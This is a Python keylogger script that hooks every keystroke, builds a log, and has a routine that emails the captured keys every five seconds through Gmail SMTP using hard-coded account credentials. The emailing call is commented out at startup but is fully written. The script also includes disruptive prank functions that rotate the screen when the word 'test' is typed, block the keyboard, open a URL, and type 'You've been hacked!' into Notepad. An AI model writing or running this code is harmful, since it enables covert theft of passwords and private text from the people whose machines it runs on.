import keyboard
import mouse
import smtplib
import pyautogui
import rotatescreen

from threading import Timer
from datetime import datetime
from time import sleep


SEND_REPORT_INTERVAL = 5
EMAIL = "keyloggerlogs145@gmail.com"
PASSWORD = "keylogger123"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'enter', 'space', 'control', 'shift', 'tab', 'esc', 'alt']

    autocorrect_words = {
        ' ' : 'SPACE',
        'there' : 'their',
        '.com' : ',com'
    }

    def start(self):
        # start keyloggerbasicbasicbasic
        keyboard.on_release(callback=self.callback)
        # start reporting keylogs
        #self.report()
        # block the current thread, wait until CTRL+C is pressed test
        keyboard.wait() 

    # Log key when pressed
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        # finally, add the key name to our global `self.log` variable
        self.log += name
        self.check_commands(self.log.lower())

    # Find and run commands from the keyboard input
    def check_commands(self, string):
        #self.autocorrect(string)
        if string.find("test") != -1:
            self.rotate_screen()


    # Block all inputs from the keyboard
    def block_keys(self):
        for key in self.keys:
            keyboard.block_key(key)

    # Unblock all input from the keyboard
    def unblock_keys(self):
        for key in self.keys:
            keyboard.unhook(key)

    # Simple test to check if the program works
    def simple_test(self):
        pyautogui.hotkey("winleft", "m")
        pyautogui.press("winleft")
        pyautogui.write("notepad")
        pyautogui.press("enter")
        sleep(0.5)
        pyautogui.write("You've been hacked!")
        self.log = ""

    # Blocks all inputs from the keyboard for len seconds then unblocks them
    def pause_keyboard(self, len):
        self.block_keys()
        sleep(len)
        self.unblock_keys()
        self.log = ""

    def autocorrect(self, string):
        for word in self.autocorrect_words.keys():
            if string.find(word) != -1:
                print(word)
                for i in range(len(word)):
                    keyboard.press('backspace')
                keyboard.write(self.autocorrect_words[word])
                self.log = ""
    
    def go_to_url(self):
        pyautogui.hotkey("winleft", "r")
        pyautogui.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        pyautogui.press("enter")
        self.log = ""

    def rotate_screen(self):
        screen = rotatescreen.get_primary_display()
        start_pos = screen.current_orientation
        new_pos = abs((start_pos - 90) % 360)
        screen.rotate_to(new_pos)
        self.log = ""


    ########## For Keylogging ##########

    # Save key log and reset timer
    def report(self):
        if self.log:
            self.send_mail(self.log)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # sets timer to daemon (dies when main thread dies)
        timer.daemon = True
        # start timer
        timer.start()

    # Send logged keys via email
    def send_mail(self, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # starts server in TLS mode
        server.starttls()
        # logs into email
        server.login(EMAIL, PASSWORD)
        # send message
        server.sendmail(EMAIL, EMAIL, message)
        # end session
        server.quit()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_INTERVAL)
    keylogger.start()